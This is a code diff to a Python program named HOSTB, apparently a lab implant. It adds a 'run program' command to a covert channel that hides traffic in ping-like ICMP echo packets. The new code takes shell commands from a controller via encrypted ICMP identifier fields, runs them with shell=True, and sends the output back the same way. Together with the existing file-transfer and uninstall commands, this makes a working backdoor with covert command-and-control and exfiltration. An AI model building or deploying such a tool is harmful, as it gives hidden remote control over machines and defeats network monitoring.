@@ -10,6 +10,7 @@ import shutil
 import signal
 import socket
 import struct
+import subprocess
 import sys
 import threading
 import time
@@ -27,11 +28,17 @@ PRE_SHARED_KEY = 0xA5C3
 CMD_DISCONNECT = 1
 CMD_TRANSFER_FILE = 2
 CMD_UNINSTALL = 3
+CMD_RUN_PROGRAM = 4
 ACK_READY = 0xFFFE
 
 RECEIVED_FILE_PREFIX = "received_"
 RECEIVED_FALLBACK_NAME = "received_file"
 FILE_TRANSFER_TIMEOUT_SECONDS = 10.0
+
+# Run-program limits.
+MAX_OUTPUT_BYTES = 0xFFFF
+SUBPROCESS_TIMEOUT_SECONDS = 30.0
+PACKET_SEND_DELAY_SECONDS = 0.002
 
 # Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
 # 0x10..0x3F filler pattern. hosta ignores this payload — it only reads
@@ -286,6 +293,85 @@ class FileReceiveWatcher:
                     self.complete.set()
 
 
+class ByteStreamWatcher:
+    """Single-header byte stream: seq=1 size, seq=2..N+1 data chunks."""
+
+    def __init__(self, expected_source):
+        self.expected_source = expected_source
+        self.byte_count: int | None = None
+        self.packets: dict[int, int] = {}
+        self.complete = threading.Event()
+        self.lock = threading.Lock()
+
+    def __call__(self, packet):
+        if self.complete.is_set():
+            return
+        if not (packet.haslayer(IP) and packet.haslayer(ICMP)):
+            return
+        if packet[IP].src != self.expected_source:
+            return
+        icmp = packet[ICMP]
+        if int(icmp.type) != 8:
+            return
+
+        encrypted = int(icmp.id) & 0xFFFF
+        sequence = int(icmp.seq) & 0xFFFF
+        value = decrypt_identifier(encrypted)
+
+        with self.lock:
+            self.packets[sequence] = value
+            if sequence == 1:
+                self.byte_count = value
+                print(f"[STREAM] byte_count={value}")
+            else:
+                print(f"[STREAM] seq={sequence} ({len(self.packets)} packets total)")
+
+            if self.byte_count is not None:
+                expected = 1 + (self.byte_count + 1) // 2
+                if len(self.packets) >= expected:
+                    self.complete.set()
+
+
+def reassemble_byte_stream(packets: dict[int, int], byte_count: int) -> bytes | None:
+    num_chunks = (byte_count + 1) // 2
+    out = bytearray()
+    for chunk_index in range(num_chunks):
+        seq = 2 + chunk_index
+        if seq not in packets:
+            return None
+        value = packets[seq]
+        out.append((value >> 8) & 0xFF)
+        out.append(value & 0xFF)
+    return bytes(out[:byte_count])
+
+
+def send_byte_stream(raw_socket, source_ip, destination_ip, payload: bytes):
+    byte_count = len(payload)
+
+    size_packet = build_icmp_echo_request(encrypt_identifier(byte_count), 1)
+    size_ip = build_ip_header(
+        source_ip, destination_ip, 20 + len(size_packet), socket.IPPROTO_ICMP
+    )
+    raw_socket.sendto(size_ip + size_packet, (destination_ip, 0))
+    if PACKET_SEND_DELAY_SECONDS > 0:
+        time.sleep(PACKET_SEND_DELAY_SECONDS)
+
+    num_chunks = (byte_count + 1) // 2
+    for chunk_index in range(num_chunks):
+        sequence = 2 + chunk_index
+        offset = chunk_index * 2
+        high = payload[offset]
+        low = payload[offset + 1] if offset + 1 < byte_count else 0
+        value = (high << 8) | low
+        icmp_packet = build_icmp_echo_request(encrypt_identifier(value), sequence)
+        ip_packet = build_ip_header(
+            source_ip, destination_ip, 20 + len(icmp_packet), socket.IPPROTO_ICMP
+        )
+        raw_socket.sendto(ip_packet + icmp_packet, (destination_ip, 0))
+        if PACKET_SEND_DELAY_SECONDS > 0:
+            time.sleep(PACKET_SEND_DELAY_SECONDS)
+
+
 # ---------------------------------------------------------------------------
 # FSM state functions
 # ---------------------------------------------------------------------------
@@ -535,6 +621,108 @@ def uninstall(ctx: Context):
     ctx.stop_requested.set()
 
 
+def run_program(ctx: Context):
+    if not ctx.connected_to:
+        return
+
+    watcher = ByteStreamWatcher(expected_source=ctx.connected_to)
+    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
+    sniffer.start()
+
+    started_event = getattr(sniffer, "started", None)
+    if isinstance(started_event, threading.Event):
+        started_event.wait(timeout=2.0)
+    else:
+        time.sleep(0.3)
+
+    source_ip = detect_source_ip(ctx.connected_to)
+    try:
+        raw_socket = open_raw_send_socket()
+    except PermissionError:
+        if sniffer.running:
+            sniffer.stop(join=True)
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+
+    try:
+        icmp_packet = build_icmp_echo_request(encrypt_identifier(ACK_READY), 1)
+        ip_header = build_ip_header(
+            source_ip, ctx.connected_to,
+            20 + len(icmp_packet), socket.IPPROTO_ICMP,
+        )
+        try:
+            raw_socket.sendto(ip_header + icmp_packet, (ctx.connected_to, 0))
+        except OSError as exc:
+            if sniffer.running:
+                sniffer.stop(join=True)
+            ctx.error_message = f"failed to send ack_ready: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+        print(f"[ACK_READY] sent to {ctx.connected_to}")
+
+        deadline = time.time() + FILE_TRANSFER_TIMEOUT_SECONDS
+        try:
+            while (
+                sniffer.running
+                and not watcher.complete.is_set()
+                and not ctx.stop_requested.is_set()
+                and time.time() < deadline
+            ):
+                time.sleep(0.05)
+        finally:
+            if sniffer.running:
+                sniffer.stop(join=True)
+
+        if not watcher.complete.is_set():
+            print(f"[RUN] command receive incomplete: got {len(watcher.packets)} packets")
+            return
+
+        command_bytes = reassemble_byte_stream(watcher.packets, watcher.byte_count)
+        if command_bytes is None:
+            print("[RUN] command reassembly failed; aborting")
+            return
+
+        try:
+            command_text = command_bytes.decode("utf-8")
+        except UnicodeDecodeError:
+            command_text = command_bytes.decode("utf-8", errors="replace")
+        print(f"[RUN] executing: {command_text!r}")
+
+        try:
+            result = subprocess.run(
+                command_text,
+                shell=True,
+                capture_output=True,
+                timeout=SUBPROCESS_TIMEOUT_SECONDS,
+            )
+            output = result.stdout + result.stderr
+            if result.returncode != 0:
+                output += f"\n[exit code: {result.returncode}]".encode("utf-8")
+        except subprocess.TimeoutExpired:
+            output = f"[command timed out after {SUBPROCESS_TIMEOUT_SECONDS}s]".encode("utf-8")
+        except Exception as exc:
+            output = f"[execution error: {exc}]".encode("utf-8")
+
+        if len(output) > MAX_OUTPUT_BYTES:
+            truncation_notice = b"\n[output truncated]"
+            output = output[:MAX_OUTPUT_BYTES - len(truncation_notice)] + truncation_notice
+            print(f"[RUN] output truncated to {MAX_OUTPUT_BYTES} bytes")
+
+        num_output_packets = (len(output) + 1) // 2
+        print(f"[RUN] sending output back ({len(output)} bytes, {num_output_packets} packets)")
+
+        try:
+            send_byte_stream(raw_socket, source_ip, ctx.connected_to, output)
+        except OSError as exc:
+            ctx.error_message = f"failed to send output: {exc}"
+            ctx.error_code = 2
+            handle_error(ctx)
+
+        print("[RUN] output sent")
+    finally:
+        raw_socket.close()
+
+
 if __name__ == "__main__":
     print("--------------- HOSTB ---------------")
     ctx = Context()
@@ -568,6 +756,9 @@ if __name__ == "__main__":
                 print("\nUninstalling...")
                 uninstall(ctx)
                 break
+            elif command_code == CMD_RUN_PROGRAM:
+                print("\nRunning program...")
+                run_program(ctx)
             else:
                 print(f"Ignoring unknown command code {command_code}.")
 
